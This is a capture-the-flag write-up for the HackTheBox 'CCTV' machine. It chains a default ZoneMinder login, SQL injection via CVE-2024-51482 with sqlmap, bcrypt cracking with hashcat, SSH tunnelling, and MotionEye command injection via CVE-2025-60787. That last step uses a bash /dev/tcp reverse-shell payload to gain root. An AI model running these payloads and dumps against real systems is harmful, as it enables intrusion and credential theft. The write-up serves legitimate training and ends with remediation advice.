---
title: CCTV
date: 2026-04-08
category: [HackTheBox, Linux, Web Exploitation, Password Attack]
tags: [nmap, ffuf, gobuster, sqlmap, hashcat]
difficulty: Easy
summary: CCTV is an easy rated box on Hack The Box
---

[Link to machine](https://app.hackthebox.com/machines/CCTV)

## Reconnaissance
#### Nmap scan:
```bash
nmap -sVC -vv -p- IP --min-rate 5000 -oN nmap-scan
```
![Pasted image 20260408085529](/images/Pasted%20image%2020260408085529.png)
#### Directory enumeration
```bash
gobuster dir -u http://cctv.htb/ -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```
![Pasted image 20260310090737](/images/Pasted%20image%2020260310090737.png)
#### Vhost fuzzing
```bash
ffuf -u http://cctv.htb/ -H "HOST:FUZZ.cctv.htb" -mc 200,301,302 -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
```
So nmap scan reveals a web service running on port 80, typing `IP:80` in to the browser resolve to a domain `cctv.htb`. Add IP and domain pair into `/etc/hosts`, we are able to land on the web page.
![Pasted image 20260407205318](/images/Pasted%20image%2020260407205318.png)
I noticed a Staff Login button on the top right, it then directs into a ZoneMinder login page at `/zm/`:
![Pasted image 20260407205443](/images/Pasted%20image%2020260407205443.png)
There is no clear clues so far, so I tried fuzzing some common username and password. Surprisingly, the pair `admin:admin` was success and then lead me to a console view:
![Pasted image 20260407205621](/images/Pasted%20image%2020260407205621.png)
Before I could happen to investigate anything specific, the version `1.37.63` suggests I should try for some known CVEs that happen to affect this current ZoneMinder instance.
## [CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
- Package: zoneminder (apt, ppa, aur)
- Affected version: 1.37.* <= 1.37.64
- Severity: 10/10 (Critical)
- Weaknesses: CWE-89
So this CVE suggests that the affected ZoneMinder instances are vulnerable to Boolean based SQL injection via following url:
```
http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1
```
![Pasted image 20260407210616](/images/Pasted%20image%2020260407210616.png)
The vulnerable function lies in `web/ajax/event.php` where the requested `tid` is passed straight into the SQL query without further sanitizing.
Confirming with sqlmap:
```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=36sqgf6frevo4ffkoafbnk9rcq"
```
with the cookie being the session cookie got after logging in.
![Pasted image 20260407212748](/images/Pasted%20image%2020260407212748.png)
Now use sqlmap to retrieve available databases on the system:
```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=7k912k0os3fojqihkp95qe5c9g" --dbs
```
![Pasted image 20260407222152](/images/Pasted%20image%2020260407222152.png)
That one `zm` database looks promising. Let's try dump all tables inside:
```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=u9knfsr25s8bkjknj1ja9rnvpn" -D zm --tables
```
![Pasted image 20260408091302](/images/Pasted%20image%2020260408091302.png)
Noticed there is a table named `Users` inside, let's try and see what it contains
Fetching the tables columns:
![Pasted image 20260408104725](/images/Pasted%20image%2020260408104725.png)
Noticed that there are some columns that might be storing useful informations: `Email`, `Name`, `Password`, `Phone`, `Username`, `System`. So let's try dump the content of those column to see what's inside:
```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=cl1lmoksme1dss9ldogbu0kh5d" -D zm -T Users -C Email,Name,Password,Username,Phone,System --dump
```
![Pasted image 20260408124002](/images/Pasted%20image%2020260408124002.png)
Okay so after researching it's indicated that the password is stored in bcrypt hash (due to the `$2y$` prefix). Knowing this and having those hashes here, I'm going to offline crack using dictionary attack and `rockyou` wordlist:
```bash
hashcat -m 3200 -a 0 hashes.txt SecLists/Passwords/Leaked-Databases/rockyou.txt
```
- `-m 3200` enable bcrypt crack mode
- `-a 0`: uses dictionary attack
![Pasted image 20260408130522](/images/Pasted%20image%2020260408130522.png)
Okay I've failed to crack the superadmin's password. Maybe it's not in the wordlist. But now that we have the credentials for a user `mark`, of course I was able to log into ZoneMinder using `mark` account but that's not the main target. Since the initial account having so default credentials, I should try if I can also use this credential to log in the target machine.
![Pasted image 20260408132944](/images/Pasted%20image%2020260408132944.png)
Okay, got the foothold so finding the user flag should be relatively easy.
Interesting, I cannot find any `user.txt` file. 
![Pasted image 20260408133419](/images/Pasted%20image%2020260408133419.png)
Also the user `mark` cannot run sudo.
Even when I have a foothold onto the machine I still cannot reach the user's flag. One thing I noticed is that in `/home` there is another user named `sa_mark`, where I suspect the user flag to lies in. 
Before trying to find creds on other user, I think I might need to try if I can escalate my privilege from mark.
First, try to find any exploitable binaries with SUID:
```bash
find / -type f -perm -u=s 2>/dev/null
```
![Pasted image 20260408135447](/images/Pasted%20image%2020260408135447.png)
But nothing here seems exploitable.
So currently every Privilege Escalation method that I've known seems not do-able at the current situation. So maybe I would have to come back and utilize those informations that I have so far.
Since the current web server running an instance of ZoneMinder, an open source video surveillance software system, maybe I can somehow inspect and make use of those config files if they are stored somewhere on the machine.
Further research shows that the web-based like ZoneMinder typically have their configure files stored in `/etc`. So I give it a try.
![Pasted image 20260408140317](/images/Pasted%20image%2020260408140317.png)
Those two directories `motion` and `motioneye` caught my attention.
By exploring those config files
![Pasted image 20260408142704](/images/Pasted%20image%2020260408142704.png)
Interesting, this motion.conf stores some kind of a credential.
![Pasted image 20260408141642](/images/Pasted%20image%2020260408141642.png)
I see that the motioneye instance is configured to accept connection on port 8765 and is bounded to only loopback interface.
First I check if the motioneye service is currently running:
```bash
ps aux | grep motioneye
```
![Pasted image 20260408141943](/images/Pasted%20image%2020260408141943.png)
Okay it's true that the motioneye service is running and we cannot reach it externally.
So I suppose to setup an SSH tunnel for port forwarding in order to access the service:
```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.244.156
```
After successfully setting up the ssh tunnel, I was able to reach the service via my browser:
![Pasted image 20260408142336](/images/Pasted%20image%2020260408142336.png)
So by trying the credentials found in the motion.conf, I was able to log in the motioneye.
![Pasted image 20260408142926](/images/Pasted%20image%2020260408142926.png)
So the version of this motioneye instance is 0.43.1b4, which suggests it is vulnerable to CVE-2025-60787.
## [CVE-2025-60787](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx)
- Package: motioneye (pip)
- Affected version: < 0.43.1b5
- Severity: 7.2/10 (High)
- Weaknesses: CWE-20, CWE-78, CWE-116
So the CVE is about MotionEye accepting arbitrary fields such as `image_file_name` and `movie_name` in the web UI. These fields are then written directly into `/etc/motioneye/camera-*.conf` without proper sanitization. "When MotionEye restarts the service, the Motion binary reads this configuration. Because Motion treats these fields as shell-expandable, injected characters (e.g. $(), backticks) are interpreted as shell commands."
Which means by appending proper shell command inside `$()`, we can force the server to execute arbitrary commands via restarting the Motion service.
## Exploit
So the step by step to reproduce the PoC of the CVE including:
- Bypassing the client-side validation, by overriding `configUiValid` function using browser's developer console.
- Go to **Camera Settings -> Still Images**, change `Set Capture Mode` to `Interval Snapshots` and change the number of `Snapshot Interval` to 10.
- Inject the payload for reverse shell:
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.26/44444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
Start netcat listener on port 44444.
![Pasted image 20260408201203](/images/Pasted%20image%2020260408201203.png)
And we got the reverse shell
![Pasted image 20260408201224](/images/Pasted%20image%2020260408201224.png)
Interestingly, this time we got the root shell! Which means the current Motion service running with root privileges. So we got two flags at once.
![Pasted image 20260408201417](/images/Pasted%20image%2020260408201417.png)
As expected, the user flag was stored inside `sa_mark`'s home directory.
![Pasted image 20260408201528](/images/Pasted%20image%2020260408201528.png)
## Summary
This machine is kinda interesting beside the fact that it doesn't give away the user flag as soon as I got the initial foothold.
Techniques used in this machine including:
- Default credentials fuzzing.
- SQL injection and database enumeration using sqlmap.
- Password dictionary attack using hashcat.
- SSH tunneling for port forwarding.
## Remediation
Some fix I would suggest for this system:
- Change the passwords (username if possible) for the ZoneMinder service. Cause the exploit chain of this machine starts with a weak default credential.
- Upgrade ZoneMinder instance to higher version (1.37.65).
- I think that storing credentials inside `motion.conf` is unusual. So those credentials should be stored somewhere safer or restrict the rights to access it. Since the Motion service might require root privileges for some permissions, those config files could be restricted to root user only.
- Upgrade the version of MotionEye.